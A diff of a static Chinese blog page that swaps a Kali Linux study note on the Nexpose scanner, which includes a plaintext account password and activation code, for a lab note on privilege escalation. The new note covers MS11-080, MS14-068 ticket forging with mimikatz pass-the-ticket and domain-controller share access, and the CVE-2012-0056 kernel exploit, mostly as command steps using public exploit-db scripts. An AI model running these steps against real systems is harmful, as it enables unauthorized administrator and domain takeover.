@@ -79,15 +79,15 @@
 
 
 
-<meta name="description" content="NEXPOSE  Rapid7 Nexpose 完整的漏洞管理实现   环境准备 建议VM 4G内存 https:&#x2F;&#x2F;www.rapid7.com&#x2F;products&#x2F;nexpose&#x2F;download&#x2F; https:&#x2F;&#x2F;IP_ADDR:3780（nxadmin&#x2F;nxpassword,后改为Rapid7@mazhentao） 操作系统账号密码：nexpose https:&#x2F;&#x2F;www.rapid7.">
+<meta name="description" content="MS11-080  MS11-080（提权漏洞） 🔺命令：searchploit MS11-080 🔺命令：cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;local&#x2F;18176.py（针对32位英文版操作系统） 🔺命令：cp 18176.py C:&#x2F;Python2.7   Kb2592799 https:&#x2F;&#x2F;technet.microsoft.com&#x2F;">
 <meta name="keywords" content="安全">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali Linux笔记(二十五)：NEXPOSE">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;10&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%BA%94)%EF%BC%9ANEXPOSE&#x2F;index.html">
+<meta property="og:title" content="Kali Linux笔记(三十一)：漏洞提权">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;22&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83&#x2F;index.html">
 <meta property="og:site_name" content="Tomas&#39;Blog">
-<meta property="og:description" content="NEXPOSE  Rapid7 Nexpose 完整的漏洞管理实现   环境准备 建议VM 4G内存 https:&#x2F;&#x2F;www.rapid7.com&#x2F;products&#x2F;nexpose&#x2F;download&#x2F; https:&#x2F;&#x2F;IP_ADDR:3780（nxadmin&#x2F;nxpassword,后改为Rapid7@mazhentao） 操作系统账号密码：nexpose https:&#x2F;&#x2F;www.rapid7.">
+<meta property="og:description" content="MS11-080  MS11-080（提权漏洞） 🔺命令：searchploit MS11-080 🔺命令：cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;windows&#x2F;local&#x2F;18176.py（针对32位英文版操作系统） 🔺命令：cp 18176.py C:&#x2F;Python2.7   Kb2592799 https:&#x2F;&#x2F;technet.microsoft.com&#x2F;">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-12-10T00:09:38.772Z">
+<meta property="og:updated_time" content="2019-12-22T12:54:32.147Z">
 <meta name="twitter:card" content="summary">
 
 
@@ -118,13 +118,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2019/12/10/Kali Linux笔记(二十五)：NEXPOSE/"/>
+  <link rel="canonical" href="http://yoursite.com/2019/12/22/Kali Linux笔记(三十一)：利用漏洞提权/"/>
 
 
 
 
 
-  <title>Kali Linux笔记(二十五)：NEXPOSE | Tomas'Blog</title>
+  <title>Kali Linux笔记(三十一)：漏洞提权 | Tomas'Blog</title>
   
 
 
@@ -243,7 +243,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%BA%94)%EF%BC%9ANEXPOSE/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%80)%EF%BC%9A%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Tomas">
@@ -260,7 +260,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(二十五)：NEXPOSE</h1>
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(三十一)：漏洞提权</h1>
         
 
         <div class="post-meta">
@@ -272,8 +272,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
-                2019-12-10
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-22T20:58:11+08:00">
+                2019-12-22
               </time>
             
 
@@ -334,84 +334,121 @@
       
         <hr>
 <ol>
-<li><p>NEXPOSE</p>
+<li><p>MS11-080</p>
 <ul>
-<li>Rapid7<ul>
-<li>Nexpose</li>
-<li>完整的漏洞管理实现</li>
+<li>MS11-080（提权漏洞）<ul>
+<li><strong><code>🔺命令：searchploit MS11-080</code></strong></li>
+<li><strong><code>🔺命令：cp /usr/share/exploitdb/exploits/windows/local/18176.py</code></strong>（针对32位英文版操作系统）</li>
+<li><strong><code>🔺命令：cp 18176.py C:/Python2.7</code></strong></li>
 </ul>
 </li>
-<li>环境准备<ul>
-<li>建议VM 4G内存</li>
-<li><a href="https://www.rapid7.com/products/nexpose/download/" target="_blank" rel="noopener">https://www.rapid7.com/products/nexpose/download/</a></li>
-<li><a href="https://IP_ADDR:3780（nxadmin/nxpassword,后改为Rapid7@mazhentao）" target="_blank" rel="noopener">https://IP_ADDR:3780（nxadmin/nxpassword,后改为Rapid7@mazhentao）</a></li>
-<li>操作系统账号密码：nexpose</li>
-<li><a href="https://www.rapid7.com/try/nexpose/" target="_blank" rel="noopener">https://www.rapid7.com/try/nexpose/</a></li>
-<li>QHWT-72GT-BHDS-FQLH（激活码进行注册，30天有效期）</li>
-<li>service nexposeconsole.cc restart（重启命令，但初始化时间非常长）</li>
+<li>Kb2592799<ul>
+<li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li>
 </ul>
 </li>
 </ul>
 </li>
 </ol>
 <blockquote>
-<pre><code>概念：用扫描器去发现漏洞，用渗透框架去验证漏洞
-▲ 2019.12.8可以注册一个企业邮箱，可申请多个（腾讯。网易等）
-▲ 2019.12.8需要修改密码，至少一个数字，一个大写字母，一个字符，长度大于14位，多次不成功会锁账号 Rapid7@mazhentao
-▲ 2019.12.8只有注册后，才可下载到ova文件</code></pre></blockquote>
+<pre><code>查看升级的补丁：运行 → appwiz.cpl → show updates → remove</code></pre></blockquote>
+<ul>
+<li>Pywin32<ul>
+<li><a href="http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/" target="_blank" rel="noopener">http://sourceforge.net/projects/pywin32/files/pywin32/Build%%20219/</a></li>
+</ul>
+</li>
+<li>Pyinstaller（文件夹需要放到Python目录下,18176.c需要放到Pyinstaller文件夹中）<ul>
+<li><a href="https://pypi.org/project/PyInstaller/2.1/#files" target="_blank" rel="noopener">https://pypi.org/project/PyInstaller/2.1/#files</a></li>
+<li><strong><code>🔺命令：..\python pyinstaller.py --onefile 18176.py</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：18176.exe -O XP</code></strong></li>
+<li><strong><code>🔺命令：net localgroup administartor a /add</code></strong>（增加本地账号到管理员组）</li>
+</ul>
 <ol start="2">
-<li><p>Administrator</p>
+<li>MS11-046（拒绝服务）<ul>
+<li>Dos</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>公司若通过域环境管理电脑，统一分配软件和权限，一般安全性很高
+在没有安装python环境的机子，可将脚本编译成exe文件（需要Pyinstaller、Pywin32）</code></pre></blockquote>
+<ol start="3">
+<li><p>MS14-068</p>
 <ul>
-<li>Scan Templates<ul>
-<li>Exhaustive → Copy</li>
-<li>General → Name → Types of Checks（Assert Discovery、Vulnerability、WebSpldering、Policies）</li>
-<li>Asset Discovery（主机发现）</li>
-<li>Service Discovery（服务发现）</li>
-<li>Discovery Performance（发现选项）</li>
-<li>Vulnerability Checks（unsafe or safe，<strong>！Select Checks！</strong>）</li>
-<li>File Searching（文件搜索）</li>
-<li>Spam Relaying（垃圾邮件）</li>
-<li>Database Servers（数据库）</li>
-<li>Mail Server（邮件服务器）</li>
-<li>CVS Serverr（版本管理服务器）</li>
-<li>DHCP Server</li>
-<li>Telnet Server</li>
-<li>Web Spldering（网页爬网，有可能造成CC攻击）</li>
-<li>Oracle Policy（Oracle 策略）</li>
-<li>Lotus Domino Policy（Lotus Domino 策略）</li>
-<li>Windows Group Policy（window 组策略）</li>
-<li>CIFS/SMB Account Policy（CIFS/SMB 账号策略）</li>
-<li>AS/400 Policy（AS/400 机型策略）</li>
-<li>Unix Policy（Unix 策略）</li>
+<li>MS14-068（远程漏洞利用）</li>
+</ul>
+</li>
+</ol>
+<blockquote>
+<pre><code>Windows XP系统利用不成
+Windows 7系统利用成功 lab\u1 penbox\w7</code></pre></blockquote>
+<ul>
+<li>库<ul>
+<li><a href="http://github.com/bidord/pykek（ms14-068.py）" target="_blank" rel="noopener">http://github.com/bidord/pykek（ms14-068.py）</a></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：searchexploit ms14-068</code></strong></li>
+<li>/usr/share/exploitdb/platforms/windows/remote/35474.py</li>
+<li><strong><code>🔺命令：python 35474.py/ms14-068.py -u user@lab.com -s userSID -d dc.lab.com</code></strong> ▲2019.12.22 35473.py/ms14-068.py脚本报错（域控制名称，如果不在域中，只能输入域控制器的IP地址）<ul>
+<li>会生成一个TGT文件票据（包含普通用户提升到管理员账号）</li>
+</ul>
+</li>
+<li>输入u1的密码</li>
+<li>拷贝<a href="mailto:TGT_user1@lab.com.ccache" target="_blank" rel="noopener">TGT_user1@lab.com.ccache</a>到提权windows系统</li>
+<li>本地管理系统<ul>
+<li><strong><code>🔺命令：minikatz.exe log &quot;kerberos::ptc TGT user@lab.com.ccache&quot; exit</code></strong></li>
+<li>访问管理共享：<strong><code>🔺命令：net use\\完整的域控制器名称\admin$</code></strong></li>
+<li>访问域控制器C盘：运行 → \完整的域控制器名称\c$</li>
+<li>打开修改注册表：regedit → 连接网络注册表 → 域控制器IP地址 → 账号：<a href="mailto:user1@lab.com" target="_blank" rel="noopener">user1@lab.com</a> 密码</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<pre><code>域管理：安全边界（有一台计算机作为管理机，可通过一台机器管理所有域内的机器）
+服务器升级为域服务器的时候，会自动把Administartor升级为域服务器管理机
+搭建域控制器Windows Server2003：
+1.配置静态IP地址，DNS服务器指向自己
+2.运行域程序的安装：dcpromo（安装过程需要光盘）
+3.DNS全名：lab.com
+4.分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）
+5.加入域的计算机，在lab.com，Computer可以管理加入域的机器，需要Administrator登陆域接收器关闭防火墙
+6.管理加入域的机器，删除域接受器本地的账号，在域接收器本地的Administrator组中加入一个新的u1域的账号，检查名称，u1具有域接收器本地管理员权限，不对其他域机器有管理员权限（可以不设置，为了后面实验）
+搭建域接受器Windows XP：
+1.准备 → 关闭防火墙 → 配置静态IP地址（DNS指向域控制器）
+2.我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）
+3.共享资源\\lab.com
+5.获取SID： 通过whoami /all 查看域的SID
+6.net view：查看域控制器完整名称</code></pre></blockquote>
+<ol start="4">
+<li><p>CVE-2012-0056</p>
+<ul>
+<li>Ubuntu11.10<ul>
+<li><a href="http://old-releases.ubuntu.com/releases/11.10" target="_blank" rel="noopener">http://old-releases.ubuntu.com/releases/11.10</a></li>
+<li><strong><code>🔺命令：searchexploit 18411.c</code></strong>（Kali上）</li>
+<li>Linux之间拷贝文件: <strong><code>🔺命令：SCP 文件 账号@IP地址：存放路径</code></strong>（通过SSH隧道，Kali端）</li>
+</ul>
+</li>
+<li>gcc（exploit-db/searchexploit都有存在EXP） <ul>
+<li><strong><code>🔺命令：mount /dev/cdrom /media/cdrom</code></strong>（挂载CD光盘设备）</li>
+<li><strong><code>🔺命令：sudo apt-cdrom add &amp;&amp; sudo apt-get install gcc</code></strong>（ubuntu停止安装更新源）</li>
+<li><strong><code>🔺命令：sudo apt-get install openssh-server</code></strong></li>
+<li><strong><code>🔺命令：gcc 18411.c -o exp</code></strong></li>
+</ul>
+</li>
+<li>CVE-2012-0056（操作系统内核对用户进程控制权限不严格）<ul>
+<li>/proc/pid/mem</li>
+<li>kernels&lt;=2.6.39</li>
+<li><a href="http://blog.zx2c4.com/749（漏洞详细原理）" target="_blank" rel="noopener">http://blog.zx2c4.com/749（漏洞详细原理）</a></li>
 </ul>
 </li>
 </ul>
 </li>
 </ol>
 <blockquote>
-<pre><code>企业在美国上市需要过塞班思发案，也即404法案，Sarbans-Oxley compliance
-支付行业要过PCI ASV Extemal Audit/PCI Internal Aduit</code></pre></blockquote>
-<ul>
-<li>Sites（在home）<ul>
-<li>Create sites</li>
-<li>INFO &amp; SECURITY</li>
-<li>ASSETS</li>
-<li>AUTHENTICATION（Web Application → HTML FORM/HTTP HEADERS（SEESIONID））</li>
-<li>TEMPLATES</li>
-<li>ENGINES（扫描引擎）</li>
-<li>ALERTS（到点，可以用于发送mail）</li>
-<li>SCHEDULE</li>
-</ul>
-</li>
-</ul>
-<ol start="3">
-<li><p>扫描结果分析</p>
-<ul>
-<li>False Positive：误报</li>
-<li>False negative：漏报</li>
-</ul>
-</li>
-</ol>
+<pre><code>/proc目录：内存中生成的临时/proc，保存了内存的实时数据，每生成一个进程，对应分配的PID，都会在这里创建一个目录
+Ubuntu下：id查看当前用户信息
+#：root用户提示符；$：普通用户提示符</code></pre></blockquote>
 
       
     </div>
@@ -442,8 +479,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E5%9B%9B)%EF%BC%9ANESSUS/" rel="next" title="Kali Linux笔记(二十四)：NESSUS">
-                <i class="fa fa-chevron-left"></i> Kali Linux笔记(二十四)：NESSUS
+              <a href="/2019/12/22/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%89%E5%8D%81%E4%B8%89)%EF%BC%9A%E6%94%B6%E9%9B%86%E4%BF%A1%E6%81%AF%E4%B8%8E%E9%9A%90%E8%94%BD%E7%97%95%E8%BF%B9/" rel="next" title="Kali Linux笔记(三十三)：收集信息与隐蔽痕迹">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(三十三)：收集信息与隐蔽痕迹
               </a>
             
           </div>
@@ -451,10 +488,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%BA%8C%E5%8D%81%E4%B8%80)%EF%BC%9ANAMP/" rel="prev" title="Kali Linux笔记(二十一)：NMAP">
-                Kali Linux笔记(二十一)：NMAP <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
